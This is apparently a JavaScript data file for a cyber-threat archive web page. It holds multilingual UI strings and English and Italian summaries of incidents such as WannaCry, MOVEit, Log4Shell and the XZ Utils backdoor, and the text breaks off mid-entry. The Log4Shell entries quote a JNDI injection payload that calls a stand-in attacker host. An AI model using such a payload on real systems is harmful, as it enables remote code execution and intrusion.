const translations = {
    en: {
        exit_btn: "[ EXIT_TO_DASHBOARD ]",
        archive_title: "> DECLASSIFIED_INTELLIGENCE_ARCHIVE",
        status_line: "ACCESS_LEVEL: LEVEL_4 | STATUS: ENCRYPTED_LINK_ACTIVE",
        filter_all: "ALL_THREATS",
        filter_apt: "APT_GROUPS",
        filter_vuln: "VULNERABILITIES",
        archive_desc: "This database contains declassified technical analyses of high-profile cyber threats, Advanced Persistent Threats (APTs), and critical vulnerabilities. All data has been verified and sanitized for educational and research purposes.",
        read_more: "READ_FULL_ANALYSIS",
        case1_title: "APT: LAZARUS GROUP",
        case1_summary: "Analysis of state-sponsored cyber-espionage and financial heist operations linked to North Korea.",
        case2_title: "WANNACRY RANSOMWARE",
        case2_summary: "Technical breakdown of the global worm exploiting the EternalBlue (MS17-010) vulnerability.",
        case3_title: "MOVEit ZERO-DAY",
        case3_summary: "Analysis of the massive SQL injection (CVE-2023-34362) used for large-scale data exfiltration.",
        case4_title: "STUXNET WORM",
        case4_summary: "Deconstruction of the most sophisticated cyber-weapon designed for industrial sabotage.",
        case5_title: "REvil RANSOMWARE",
        case5_summary: "Analysis of the RaaS model and the supply chain attack against Kaseya VSA.",
        case6_title: "CROWDSTRIKE INCIDENT",
        case6_summary: "Technical post-mortem of the logic error in Channel File 291 that crashed 8.5M devices.",
        case7_title: "SOLARWINDS SUNBURST",
        case7_summary: "Deep dive into the supply chain compromise of the Orion platform by APT29.",
        case8_title: "LOG4SHELL (CVE-2021-44228)",
        case8_summary: "Analysis of the Java logging library vulnerability that set the internet on fire.",
        case9_title: "NSO PEGASUS SPYWARE",
        case9_summary: "Investigation into the zero-click mobile surveillance tool used against high-value targets.",
        case10_title: "COLONIAL PIPELINE",
        case10_summary: "Ransomware attack by DarkSide that paralyzed the US East Coast fuel supply.",
        case11_title: "LAPSUS$ OPERATIONS",
        case11_summary: "Teenage hacking group that breached NVIDIA, Microsoft, and Uber using social engineering.",
        case12_title: "SMART CONTRACT EXPLOIT",
        case12_summary: "Technical analysis of bridge vulnerabilities in decentralized finance (DeFi) networks.",
        case13_title: "LOCKBIT 3.0 (CRONOS)",
        case13_summary: "Deconstruction of the most prolific RaaS and the Operation Cronos takedown.",
        case14_title: "XZ UTILS BACKDOOR",
        case14_summary: "The sophisticated multi-year social engineering attack to backdoor the Linux SSH.",
        case15_title: "POST-QUANTUM TRANSITION",
        case15_summary: "Technical report on Harvest Now, Decrypt Later (HNDL) strategy and PQC migration."
    },
    it: {
        exit_btn: "[ DISCONNETTI ]",
        archive_title: "> ARCHIVIO_INTELLIGENCE_DECLASSIFICATO",
        status_line: "LIVELLO_ACCESSO: 4 | STATO: TUNNEL_CRITTOGRAFATO_ATTIVO",
        filter_all: "TUTTE_LE_MINACCE",
        filter_apt: "GRUPPI_APT",
        filter_vuln: "VULNERABILITÀ",
        archive_desc: "Questo database contiene analisi tecniche declassificate di minacce informatiche di alto profilo, Advanced Persistent Threats (APT) e vulnerabilità critiche. Tutti i dati sono stati verificati e bonificati per scopi educativi e di ricerca.",
        read_more: "LEGGI_ANALISI_COMPLETA",
        case1_title: "APT: GRUPPO LAZARUS",
        case1_summary: "Analisi delle operazioni di spionaggio informatico e furti finanziari legati alla Corea del Nord.",
        case2_title: "WANNACRY RANSOMWARE",
        case2_summary: "Analisi tecnica del worm che ha sfruttato la vulnerabilità EternalBlue (MS17-010).",
        case3_title: "MOVEit ZERO-DAY",
        case3_summary: "Analisi della SQL injection massiva (CVE-2023-34362) usata per l'esfiltrazione dati.",
        case4_title: "WORM STUXNET",
        case4_summary: "Decostruzione della più sofisticata arma informatica progettata per il sabotaggio industriale.",
        case5_title: "REvil RANSOMWARE",
        case5_summary: "Analisi del modello RaaS e dell'attacco supply chain contro Kaseya VSA.",
        case6_title: "INCIDENTE CROWDSTRIKE",
        case6_summary: "Post-mortem tecnico dell'errore logico nel Channel File 291 che ha bloccato 8.5M di dispositivi.",
        case7_title: "SOLARWINDS SUNBURST",
        case7_summary: "Analisi approfondita della compromissione della supply chain della piattaforma Orion da parte di APT29.",
        case8_title: "LOG4SHELL (CVE-2021-44228)",
        case8_summary: "Analisi della vulnerabilità nella libreria di logging Java che ha messo a rischio l'intero web.",
        case9_title: "SPYWARE NSO PEGASUS",
        case9_summary: "Indagine sullo strumento di sorveglianza mobile zero-click utilizzato contro bersagli ad alto profilo.",
        case10_title: "COLONIAL PIPELINE",
        case10_summary: "Attacco ransomware di DarkSide che ha paralizzato la fornitura di carburante sulla costa est degli USA.",
        case11_title: "OPERAZIONI LAPSUS$",
        case11_summary: "Gruppo hacker adolescente che ha violato NVIDIA, Microsoft e Uber tramite social engineering.",
        case12_title: "EXPLOIT SMART CONTRACT",
        case12_summary: "Analisi tecnica delle vulnerabilità dei bridge nelle reti di finanza decentralizzata (DeFi).",
        case13_title: "LOCKBIT 3.0 (CRONOS)",
        case13_summary: "Decostruzione del RaaS più prolifico e dell'operazione internazionale Cronos.",
        case14_title: "BACKDOOR XZ UTILS",
        case14_summary: "Il sofisticato attacco di ingegneria sociale pluriennale per inserire una backdoor in SSH su Linux.",
        case15_title: "TRANSIZIONE POST-QUANTUM",
        case15_summary: "Report tecnico sulla strategia 'Harvest Now, Decrypt Later' e sulla migrazione crittografica PQC."
    },
    es: {
        exit_btn: "[ DESCONECTAR ]",
        archive_title: "> ARCHIVO_DE_INTELIGENCIA_DESCLASIFICADO",
        status_line: "NIVEL_ACCESO: 4 | ESTADO: ENLACE_ENCRIPTADO_ACTIVO",
        filter_all: "TODAS_LAS_AMENAZAS",
        filter_apt: "GRUPOS_APT",
        filter_vuln: "VULNERABILIDADES",
        archive_desc: "Esta base de datos contiene análisis técnicos desclasificados de amenazas cibernéticas de alto perfil, Amenazas Persistentes Avanzadas (APT) y vulnerabilidades críticas. Todos los datos han sido verificados y sanitizados con fines educativos y de investigación.",
        read_more: "LEER_ANÁLISIS_COMPLETO",
        case1_title: "APT: GRUPO LAZARUS",
        case1_summary: "Análisis de operaciones de ciberespionaje y robos financieros vinculados a Corea del Norte.",
        case2_title: "WANNACRY RANSOMWARE",
        case2_summary: "Desglose técnico del gusano que explotó la vulnerabilidad EternalBlue (MS17-010).",
        case3_title: "MOVEit ZERO-DAY",
        case3_summary: "Análisis de la inyección SQL masiva (CVE-2023-34362) utilizada para la exfiltración de datos.",
        case4_title: "STUXNET WORM",
        case4_summary: "Deconstrucción del arma cibernética más sofisticada diseñada para el sabotaje industrial.",
        case5_title: "REvil RANSOMWARE",
        case5_summary: "Análisis del modelo RaaS y del ataque a la cadena de suministro contra Kaseya VSA.",
        case6_title: "INCIDENTE CROWDSTRIKE",
        case6_summary: "Post-mortem técnico del error lógico en el Channel File 291 que colapsó 8.5M de dispositivos.",
        case7_title: "SOLARWINDS SUNBURST",
        case7_summary: "Inmersión profunda en el compromiso de la cadena de suministro de la plataforma Orion por APT29.",
        case8_title: "LOG4SHELL (CVE-2021-44228)",
        case8_summary: "Análisis de la vulnerabilidad de la biblioteca de registro de Java que incendió Internet.",
        case9_title: "SPYWARE NSO PEGASUS",
        case9_summary: "Investigación sobre la herramienta de vigilancia móvil zero-click utilizada contra objetivos de alto valor.",
        case10_title: "COLONIAL PIPELINE",
        case10_summary: "Ataque de ransomware por DarkSide que paralizó el suministro de combustible de la costa este de EE. UU.",
        case11_title: "OPERACIONES LAPSUS$",
        case11_summary: "Grupo de piratas informáticos adolescentes que vulneró NVIDIA, Microsoft y Uber mediante ingeniería social.",
        case12_title: "EXPLOIT DE CONTRATOS INTELIGENTES",
        case12_summary: "Análisis técnico de vulnerabilidades de puentes en redes de finanzas descentralizadas (DeFi).",
        case13_title: "LOCKBIT 3.0 (CRONOS)",
        case13_summary: "Deconstrucción del RaaS más prolífico y el desmantelamiento de la Operación Cronos.",
        case14_title: "BACKDOOR XZ UTILS",
        case14_summary: "El sofisticado ataque de ingeniería social de varios años para crear una puerta trasera en el SSH de Linux.",
        case15_title: "TRANSICIÓN POST-CUÁNTICA",
        case15_summary: "Informe técnico sobre la estrategia Harvest Now, Decrypt Later (HNDL) y migración PQC."
    }
};

const reportDetails = {
    en: {
        "case-1": `
            <strong>CONTEXT:</strong> State-sponsored actor (North Korea) focused on funding the regime bypassing international sanctions through massive cyber-heists and crypto theft.<br><br>
            <strong>TECHNICAL BREAKDOWN:</strong>
            <ul>
                <li><strong>Payload:</strong> Custom 'Manuscrypt' backdoor.</li>
                <li><strong>Execution:</strong> DLL Side-loading through legitimate signed binaries to bypass EDR.</li>
                <li><strong>C2 Infrastructure:</strong> Multi-tier proxy network masking exfiltration traffic.</li>
            </ul><br>
            <strong>IMPACT & EFFECTS:</strong> Hundreds of millions of dollars stolen globally (e.g., Bangladesh Bank heist, Ronin Network). Severe compromise of DeFi platforms.<br><br>
            <strong>RESOLUTION:</strong> Enhanced SWIFT network security protocols, international sanctions, and freezing of laundered crypto assets by global task forces.
        `,
        "case-2": `
            <strong>CONTEXT:</strong> May 2017 global ransomware epidemic. The threat actors weaponized 'EternalBlue', an exploit allegedly developed by the NSA and leaked by the Shadow Brokers.<br><br>
            <strong>TECHNICAL BREAKDOWN:</strong>
            <ul>
                <li><strong>Exploitation:</strong> Buffer overflow in the SMBv1 protocol via crafted packets.</li>
                <li><strong>Propagation:</strong> DoublePulsar backdoor installed the payload spreading it automatically across LANs and WANs.</li>
            </ul><br>
            <strong>IMPACT & EFFECTS:</strong> 200,000+ computers infected in 150 countries. Critical disruption to the UK's NHS, FedEx, and global logistics, causing billions in damages.<br><br>
            <strong>RESOLUTION:</strong> A security researcher (Marcus Hutchins) registered a hardcoded "kill-switch" domain, halting the worm's spread. Microsoft issued emergency out-of-band patches (KB4012598).
        `,
        "case-3": `
            <strong>CONTEXT:</strong> May 2023 zero-day exploitation by the Cl0p ransomware gang targeting Progress Software's MOVEit Transfer, a managed file transfer (MFT) solution.<br><br>
            <strong>TECHNICAL BREAKDOWN:</strong>
            <ul>
                <li><strong>Injection:</strong> Unauthenticated SQL Injection (CVE-2023-34362) in the 'moveitisapi.dll' endpoint.</li>
                <li><strong>Web Shell:</strong> Deployment of 'human2.aspx' to manipulate Azure Blob Storage.</li>
            </ul><br>
            <strong>IMPACT & EFFECTS:</strong> Exfiltration of highly sensitive data affecting over 60 million individuals and thousands of government and corporate entities worldwide.<br><br>
            <strong>RESOLUTION:</strong> Vendor released emergency patches. Organizations were forced to rotate all service account credentials, Azure SAS tokens, and audit IIS logs for exfiltration signs.
        `,
        "case-4": `
            <strong>CONTEXT:</strong> Discovered in 2010, widely believed to be a joint US-Israeli cyberweapon aimed at sabotaging Iran's nuclear enrichment program.<br><br>
            <strong>TECHNICAL BREAKDOWN:</strong>
            <ul>
                <li><strong>Zero-Days:</strong> Utilized four 0-days, including LNK vulnerability (CVE-2010-2568).</li>
                <li><strong>Payload:</strong> Injected code into Siemens Simatic S7-300 PLCs, altering centrifuge rotor speeds while spoofing normal telemetry to operators.</li>
            </ul><br>
            <strong>IMPACT & EFFECTS:</strong> Physically destroyed approximately 1,000 nuclear centrifuges at the Natanz facility, significantly delaying the nuclear program. It changed the landscape of ICS/OT security forever.<br><br>
            <strong>RESOLUTION:</strong> The code eventually escaped into the wild. Siemens updated PLC firmware, and industries globally adopted strict air-gapping and zero-trust OT architecture.
        `,
        "case-5": `
            <strong>CONTEXT:</strong> July 2021 supply chain attack. The REvil gang compromised Kaseya VSA, a remote monitoring tool used by Managed Service Providers (MSPs).<br><br>
            <strong>TECHNICAL BREAKDOWN:</strong>
            <ul>
                <li><strong>Vector:</strong> Authentication bypass and arbitrary command execution on VSA servers.</li>
                <li><strong>Deployment:</strong> Pushed malicious payloads as legitimate "software updates" disabling Windows Defender via PowerShell.</li>
            </ul><br>
            <strong>IMPACT & EFFECTS:</strong> Up to 1,500 downstream businesses encrypted globally. Massive operational downtime with an initial ransom demand of $70 million.<br><br>
            <strong>RESOLUTION:</strong> Kaseya shut down SaaS servers immediately and deployed patches. A universal decryptor key was later obtained through global law enforcement operations.
        `,
        "case-6": `
            <strong>CONTEXT:</strong> July 2024 global IT outage. Not a cyberattack, but a catastrophic failure in QA testing by cybersecurity vendor CrowdStrike during a routine sensor update.<br><br>
            <strong>TECHNICAL BREAKDOWN:</strong>
            <ul>
                <li><strong>Logic Error:</strong> Channel File 291 update contained an out-of-bounds memory read (null pointer reference).</li>
                <li><strong>Kernel Panic:</strong> As the Falcon sensor operates at Ring 0 (Kernel), the invalid read triggered an immediate BugCheck.</li>
            </ul><br>
            <strong>IMPACT & EFFECTS:</strong> 8.5 million Windows devices crashed into a Blue Screen of Death (BSOD) loop. Grounded flights globally, halted banking operations, and disrupted hospitals.<br><br>
            <strong>RESOLUTION:</strong> Required manual intervention (booting into Safe Mode to delete the corrupted .sys file). CrowdStrike subsequently completely overhauled their staged rollout and testing procedures.
        `,
        "case-7": `
            <strong>CONTEXT:</strong> 2020 State-sponsored supply chain attack (attributed to Russian SVR). Infiltrated the build process of SolarWinds Orion platform.<br><br>
            <strong>TECHNICAL BREAKDOWN:</strong>
            <ul>
                <li><strong>Backdoor:</strong> 'SUNBURST' malicious code injected into legitimate 'SolarWinds.Orion.Core.BusinessLayer.dll'.</li>
                <li><strong>Technique:</strong> 'Golden SAML' attacks to forge authentication tokens and bypass MFA, moving laterally to cloud environments.</li>
            </ul><br>
            <strong>IMPACT & EFFECTS:</strong> Compromised dozens of US government agencies and Fortune 500 companies. Undetected exfiltration for over 9 months.<br><br>
            <strong>RESOLUTION:</strong> Full network rebuilds for affected entities. CISA issued emergency directives mandating disconnection of Orion instances.
        `,
        "case-8": `
            <strong>CONTEXT:</strong> Late 2021 discovery of a critical RCE in the ubiquitous Java logging library Apache Log4j (CVE-2021-44228).<br><br>
            <strong>TECHNICAL BREAKDOWN:</strong>
            <ul>
                <li><strong>Mechanism:</strong> JNDI injection via LDAP/RMI lookups in log strings.</li>
                <li><strong>Exploit:</strong> Attacker sends a payload like <code>\${jndi:ldap://attacker.com/a}</code> to trigger remote code execution without authentication.</li>
            </ul><br>
            <strong>IMPACT & EFFECTS:</strong> Affected billions of enterprise devices and cloud services (AWS, iCloud, Steam). Immediate massive scanning and exploitation by threat actors.<br><br>
            <strong>RESOLUTION:</strong> Global emergency patching to Log4j 2.17.1+. Widespread implementation of WAF rules to block JNDI lookup patterns.
        `,
        "case-9": `
            <strong>CONTEXT:</strong> Advanced zero-click spyware developed by NSO Group, used extensively for surveillance of journalists, activists, and world leaders.<br><br>
            <strong>TECHNICAL BREAKDOWN:</strong>
            <ul>
                <li><strong>Vector:</strong> Zero-click exploits targeting iMessage (FORCEDENTRY - CVE-2021-30860) and WhatsApp.</li>
                <li><strong>Exploit:</strong> Malformed PDF utilizing JBIG2 compression to trigger an integer overflow in CoreGraphics.</li>
                <li><strong>Capability:</strong> Full access to microphone, camera, GPS, and encrypted messages (bypassing end-to-end encryption).</li>
            </ul><br>
            <strong>IMPACT & EFFECTS:</strong> Global human rights violations. Significant diplomatic fallout and exposure of extensive state surveillance programs.<br><br>
            <strong>RESOLUTION:</strong> Apple and Google implemented advanced hardware-level defenses (e.g., Lockdown Mode). NSO Group placed on the US Entity List.
        `,
        "case-10": `
            <strong>CONTEXT:</strong> May 2021 ransomware attack by the DarkSide group targeting the largest fuel pipeline in the United States.<br><br>
            <strong>TECHNICAL BREAKDOWN:</strong>
            <ul>
                <li><strong>Entry:</strong> Compromised legacy VPN account credentials (discovered in previous data breaches) lacking MFA.</li>
                <li><strong>Encryption:</strong> Targeted billing and IT systems, forcing a proactive operational shutdown of the OT network to prevent spread.</li>
            </ul><br>
            <strong>IMPACT & EFFECTS:</strong> Panic buying and fuel shortages across the US East Coast. Company paid a $4.4M ransom in Bitcoin.<br><br>
            <strong>RESOLUTION:</strong> FBI successfully recovered a significant portion of the ransom. Issuance of US Executive Orders mandating stricter pipeline security regulations.
        `,
        "case-11": `
            <strong>CONTEXT:</strong> Highly capable teenage threat actor group that successfully breached major tech corporations using aggressive social engineering.<br><br>
            <strong>TECHNICAL BREAKDOWN:</strong>
            <ul>
                <li><strong>Vector:</strong> SIM swapping, purchasing session tokens, and bribing insiders.</li>
                <li><strong>Execution:</strong> MFA fatigue attacks (spamming 2FA prompts until the user approves) and helpdesk social engineering to gain initial access.</li>
            </ul><br>
            <strong>IMPACT & EFFECTS:</strong> Exfiltration of proprietary source code from NVIDIA, Microsoft (Bing/Cortana), Samsung, and Okta.<br><br>
            <strong>RESOLUTION:</strong> International law enforcement operation leading to the arrest of key members in the UK and Brazil. Increased industry focus on phishing-resistant MFA (FIDO2).
        `,
        "case-12": `
            <strong>CONTEXT:</strong> Escalating trend of massive financial thefts targeting vulnerabilities in Web3 protocols and cross-chain bridges.<br><br>
            <strong>TECHNICAL BREAKDOWN:</strong>
            <ul>
                <li><strong>Vulnerabilities:</strong> Logic errors in smart contracts, compromised private keys of bridge validators, and flash loan attacks manipulating price oracles.</li>
                <li><strong>Execution:</strong> Attackers exploit smart contract bugs to drain liquidity pools or mint unauthorized tokens.</li>
            </ul><br>
            <strong>IMPACT & EFFECTS:</strong> Billions of dollars lost annually (e.g., Ronin Network $625M, Poly Network $610M). Severe destabilization of DeFi ecosystems.<br><br>
            <strong>RESOLUTION:</strong> Increased reliance on rigorous smart contract auditing, bug bounties, and implementation of decentralized validator networks.
        `,
        "case-13": `
            <strong>CONTEXT:</strong> Operation Cronos (2024), a multinational law enforcement task force that dismantled the infrastructure of LockBit, the world's most prolific RaaS.<br><br>
            <strong>TECHNICAL BREAKDOWN:</strong>
            <ul>
                <li><strong>Payload:</strong> LockBit Black (v3.0) utilizing fast, multi-threaded encryption and living-off-the-land (LotL) techniques.</li>
                <li><strong>Takedown:</strong> NCA and FBI compromised LockBit's primary administration environment, seizing source code, decryption keys, and affiliate data.</li>
            </ul><br>
            <strong>IMPACT & EFFECTS:</strong> Disruption of thousands of potential attacks. Massive blow to the RaaS ecosystem and affiliate trust.<br><br>
            <strong>RESOLUTION:</strong> Release of a free decryption tool for victims. Indictments and sanctions against key LockBit operators globally.
        `,
        "case-14": `
            <strong>CONTEXT:</strong> 2024 discovery of a highly sophisticated, multi-year supply chain attack targeting the XZ Utils data compression library (CVE-2024-3094).<br><br>
            <strong>TECHNICAL BREAKDOWN:</strong>
            <ul>
                <li><strong>Social Engineering:</strong> Threat actor 'Jia Tan' gained maintainer status over several years through persistent contributions.</li>
                <li><strong>Payload:</strong> Obfuscated backdoor injected into the build process, modifying <code>liblzma</code> to intercept SSH connections.</li>
                <li><strong>Execution:</strong> Allowed attackers to execute arbitrary code via SSH using a specific private key before authentication.</li>
            </ul><br>
            <strong>IMPACT & EFFECTS:</strong> Averted a catastrophic global backdoor in major Linux distributions (Debian, Ubuntu, Fedora).<br><br>
            <strong>RESOLUTION:</strong> Discovered accidentally by a Microsoft engineer analyzing SSH latency. Immediate rollback of XZ Utils versions across all Linux distros.
        `,
        "case-15": `
            <strong>CONTEXT:</strong> The looming cryptographic crisis ('Q-Day') where Cryptographically Relevant Quantum Computers (CRQCs) break current public-key cryptography.<br><br>
            <strong>TECHNICAL BREAKDOWN:</strong>
            <ul>
                <li><strong>Threat:</strong> Shor's Algorithm running on a CRQC can factor large primes, rendering RSA, ECC, and Diffie-Hellman obsolete.</li>
                <li><strong>Strategy:</strong> Nation-states are employing 'Harvest Now, Decrypt Later' (HNDL) tactics, storing encrypted traffic for future decryption.</li>
            </ul><br>
            <strong>IMPACT & EFFECTS:</strong> Total compromise of secure communications, digital signatures, and historical encrypted data.<br><br>
            <strong>RESOLUTION:</strong> NIST standardization of Post-Quantum Cryptography (PQC) algorithms (e.g., Kyber, Dilithium). Global push for cryptographic agility in enterprise systems.
        `
    },
    it: {
        "case-1": `
            <strong>CONTESTO:</strong> Attore state-sponsored (Corea del Nord) focalizzato sul finanziamento del regime eludendo le sanzioni internazionali attraverso furti finanziari e di criptovalute su larga scala.<br><br>
            <strong>ANALISI TECNICA:</strong>
            <ul>
                <li><strong>Payload:</strong> Backdoor personalizzata 'Manuscrypt'.</li>
                <li><strong>Esecuzione:</strong> DLL Side-loading tramite binari legittimi firmati per eludere i sistemi EDR.</li>
                <li><strong>Infrastruttura C2:</strong> Rete proxy multi-livello per mascherare il traffico di esfiltrazione.</li>
            </ul><br>
            <strong>EFFETTI E IMPATTO:</strong> Centinaia di milioni di dollari rubati a livello globale (es. attacco alla Banca del Bangladesh, Ronin Network). Grave compromissione delle piattaforme DeFi.<br><br>
            <strong>RISOLUZIONE:</strong> Miglioramento dei protocolli di sicurezza della rete SWIFT, sanzioni internazionali e congelamento degli asset crittografici riciclati da parte delle task force globali.
        `,
        "case-2": `
            <strong>CONTESTO:</strong> Epidemia globale di ransomware del maggio 2017. Gli attaccanti hanno armato 'EternalBlue', un exploit sviluppato dalla NSA e trapelato tramite i Shadow Brokers.<br><br>
            <strong>ANALISI TECNICA:</strong>
            <ul>
                <li><strong>Sfruttamento:</strong> Buffer overflow nel protocollo SMBv1 tramite pacchetti manipolati.</li>
                <li><strong>Propagazione:</strong> La backdoor DoublePulsar ha installato il payload diffondendolo automaticamente attraverso LAN e WAN.</li>
            </ul><br>
            <strong>EFFETTI E IMPATTO:</strong> Oltre 200.000 computer infettati in 150 paesi. Interruzione critica del sistema sanitario britannico (NHS), di FedEx e della logistica globale, causando danni per miliardi.<br><br>
            <strong>RISOLUZIONE:</strong> Un ricercatore (Marcus Hutchins) ha registrato un dominio "kill-switch" hardcoded nel codice, bloccando la diffusione. Microsoft ha rilasciato patch di emergenza fuori ciclo (KB4012598).
        `,
        "case-3": `
            <strong>CONTESTO:</strong> Maggio 2023, sfruttamento zero-day da parte della gang ransomware Cl0p contro MOVEit Transfer di Progress Software, una soluzione per il trasferimento sicuro di file (MFT).<br><br>
            <strong>ANALISI TECNICA:</strong>
            <ul>
                <li><strong>Iniezione:</strong> SQL Injection non autenticata (CVE-2023-34362) nell'endpoint 'moveitisapi.dll'.</li>
                <li><strong>Web Shell:</strong> Distribuzione di 'human2.aspx' per manipolare l'Azure Blob Storage.</li>
            </ul><br>
            <strong>EFFETTI E IMPATTO:</strong> Esfiltrazione di dati altamente sensibili che ha colpito oltre 60 milioni di individui e migliaia di enti governativi e aziendali in tutto il mondo.<br><br>
            <strong>RISOLUZIONE:</strong> Il vendor ha rilasciato patch di emergenza. Le organizzazioni hanno dovuto ruotare le credenziali degli account di servizio, i token SAS di Azure e analizzare i log IIS per rilevare le esfiltrazioni.
        `,
        "case-4": `
            <strong>CONTESTO:</strong> Scoperto nel 2010, si ritiene sia un'arma informatica congiunta USA-Israele volta a sabotare il programma di arricchimento nucleare dell'Iran.<br><br>
            <strong>ANALISI TECNICA:</strong>
            <ul>
                <li><strong>Zero-Days:</strong> Ha utilizzato quattro vulnerabilità 0-day, inclusa la falla LNK (CVE-2010-2568).</li>
                <li><strong>Payload:</strong> Codice iniettato nei PLC Siemens Simatic S7-300, che ha alterato la velocità dei rotori delle centrifughe falsificando al contempo la telemetria mostrata agli operatori.</li>
            </ul><br>
            <strong>EFFETTI E IMPATTO:</strong> Ha distrutto fisicamente circa 1.000 centrifughe nucleari nell'impianto di Natanz, ritardando significativamente il programma nucleare. Ha cambiato per sempre il panorama della sicurezza ICS/OT.<br><br>
            <strong>RISOLUZIONE:</strong> Il codice è infine sfuggito al controllo finendo su internet. Siemens ha aggiornato i firmware dei PLC e le industrie hanno adottato rigide architetture OT "air-gapped" e zero-trust.
        `,
        "case-5": `
            <strong>CONTESTO:</strong> Attacco alla supply chain del luglio 2021. La gang REvil ha compromesso Kaseya VSA, uno strumento di monitoraggio remoto utilizzato dai Managed Service Providers (MSP).<br><br>
            <strong>ANALISI TECNICA:</strong>
            <ul>
                <li><strong>Vettore:</strong> Bypass dell'autenticazione ed esecuzione di comandi arbitrari sui server VSA.</li>
                <li><strong>Distribuzione:</strong> Ha inviato payload malevoli mascherati da "aggiornamenti software" legittimi, disabilitando Windows Defender tramite PowerShell.</li>
            </ul><br>
            <strong>EFFETTI E IMPATTO:</strong> Fino a 1.500 aziende a valle crittografate a livello globale. Enormi tempi di inattività operativa con una richiesta di riscatto iniziale di 70 milioni di dollari.<br><br>
            <strong>RISOLUZIONE:</strong> Kaseya ha spento immediatamente i server SaaS e ha distribuito patch. Una chiave di decrittazione universale è stata successivamente ottenuta tramite operazioni delle forze dell'ordine internazionali.
        `,
        "case-6": `
            <strong>CONTESTO:</strong> Disservizio IT globale del luglio 2024. Non un attacco informatico, ma un catastrofico fallimento nei test di QA da parte di CrowdStrike durante un aggiornamento di routine del sensore.<br><br>
            <strong>ANALISI TECNICA:</strong>
            <ul>
                <li><strong>Errore Logico:</strong> L'aggiornamento del Channel File 291 conteneva una lettura di memoria fuori limite (riferimento a un puntatore nullo).</li>
                <li><strong>Kernel Panic:</strong> Poiché il sensore Falcon opera al Ring 0 (Kernel), la lettura non valida ha innescato un BugCheck immediato.</li>
            </ul><br>
            <strong>EFFETTI E IMPATTO:</strong> 8,5 milioni di dispositivi Windows si sono bloccati in un loop di Blue Screen of Death (BSOD). Voli bloccati a livello globale, operazioni bancarie interrotte e ospedali paralizzati.<br><br>
            <strong>RISOLUZIONE:</strong> Ha richiesto un intervento manuale (avvio in modalità provvisoria per eliminare il file .sys corrotto). CrowdStrike ha successivamente revisionato completamente le proprie procedure di test e di rilascio scaglionato.
        `,
        "case-7": `
            <strong>CONTESTO:</strong> Attacco supply chain 2020 (attribuito al SVR russo). Infiltrazione nel processo di build della piattaforma SolarWinds Orion.<br><br>
            <strong>ANALISI TECNICA:</strong>
            <ul>
                <li><strong>Backdoor:</strong> Codice malevolo 'SUNBURST' iniettato nella DLL legittima 'SolarWinds.Orion.Core.BusinessLayer.dll'.</li>
                <li><strong>Tecnica:</strong> Attacchi 'Golden SAML' per falsificare token di autenticazione e bypassare l'MFA, muovendosi lateralmente in ambienti cloud.</li>
            </ul><br>
            <strong>EFFETTI E IMPATTO:</strong> Compromissione di dozzine di agenzie governative USA e aziende Fortune 500. Esfiltrazione non rilevata per oltre 9 mesi.<br><br>
            <strong>RISOLUZIONE:</strong> Ricostruzione totale delle reti per le entità colpite. Direttive d'emergenza CISA per disconnettere le istanze Orion.
        `,
        "case-8": `
            <strong>CONTESTO:</strong> Scoperta a fine 2021 di una RCE critica nell'onnipresente libreria di logging Java Apache Log4j (CVE-2021-44228).<br><br>
            <strong>ANALISI TECNICA:</strong>
            <ul>
                <li><strong>Meccanismo:</strong> Iniezione JNDI tramite lookup LDAP/RMI nelle stringhe di log.</li>
                <li><strong>Exploit:</strong> L'attaccante invia un payload come <code>\${jndi:ldap://attacker.com/a}</code> per innescare l'esecuzione di codice remoto senza autenticazione.</li>
            </ul><br>
            <strong>EFFETTI E IMPATTO:</strong> Miliardi di dispositivi enterprise e servizi cloud colpiti (AWS, iCloud). Scansioni e sfruttamento di massa immediati da parte di threat actor.<br><br>
            <strong>RISOLUZIONE:</strong> Patching di emergenza globale a Log4j 2.17.1+. Implementazione diffusa di regole WAF per bloccare i pattern di lookup JNDI.
        `,
        "case-9": `
            <strong>CONTESTO:</strong> Spyware avanzato zero-click sviluppato da NSO Group, ampiamente utilizzato per la sorveglianza di giornalisti, attivisti e leader mondiali.<br><br>
            <strong>ANALISI TECNICA:</strong>
            <ul>
                <li><strong>Vettore:</strong> Exploit zero-click mirati a iMessage (FORCEDENTRY - CVE-2021-30860) e WhatsApp.</li>
                <li><strong>Exploit:</strong> PDF malformato che utilizzava la compressione JBIG2 per innescare un integer overflow in CoreGraphics.</li>
                <li><strong>Capacità:</strong> Accesso completo a microfono, fotocamera, GPS e messaggi criptati (bypassando la crittografia end-to-end).</li>
            </ul><br>
            <strong>EFFETTI E IMPATTO:</strong> Violazioni globali dei diritti umani. Significative ripercussioni diplomatiche ed esposizione di vasti programmi di sorveglianza statale.<br><br>
            <strong>RISOLUZIONE:</strong> Apple e Google hanno implementato difese avanzate a livello hardware (es. Lockdown Mode). NSO Group è stata inserita nella Entity List degli USA.
        `,
        "case-10": `
            <strong>CONTESTO:</strong> Attacco ransomware del maggio 2021 da parte del gruppo DarkSide al più grande oleodotto degli Stati Uniti.<br><br>
            <strong>ANALISI TECNICA:</strong>
            <ul>
                <li><strong>Ingresso:</strong> Credenziali di un account VPN legacy compromesse (scoperte in precedenti violazioni di dati) prive di MFA.</li>
                <li><strong>Cifratura:</strong> Sistemi IT e di fatturazione colpiti, costringendo a uno spegnimento operativo proattivo della rete OT per prevenire la diffusione.</li>
            </ul><br>
            <strong>EFFETTI E IMPATTO:</strong> Acquisti dettati dal panico e carenza di carburante in tutta la costa orientale degli Stati Uniti. L'azienda ha pagato un riscatto di 4,4 milioni di dollari in Bitcoin.<br><br>
            <strong>RISOLUZIONE:</strong> L'FBI ha recuperato con successo una parte significativa del riscatto. Emissione di ordini esecutivi negli Stati Uniti per normative di sicurezza più severe per gli oleodotti.
        `,
        "case-11": `
            <strong>CONTESTO:</strong> Gruppo di threat actor adolescenti altamente capace che ha violato con successo importanti aziende tecnologiche utilizzando un'ingegneria sociale aggressiva.<br><br>
            <strong>ANALISI TECNICA:</strong>
            <ul>
                <li><strong>Vettore:</strong> SIM swapping, acquisto di token di sessione e corruzione di insider.</li>
                <li><strong>Esecuzione:</strong> Attacchi di "MFA fatigue" (invio massivo di richieste 2FA fino all'approvazione dell'utente) e ingegneria sociale sull'helpdesk per ottenere l'accesso iniziale.</li>
            </ul><br>
            <strong>EFFETTI E IMPATTO:</strong> Esfiltrazione di codice sorgente proprietario da NVIDIA, Microsoft (Bing/Cortana), Samsung e Okta.<br><br>
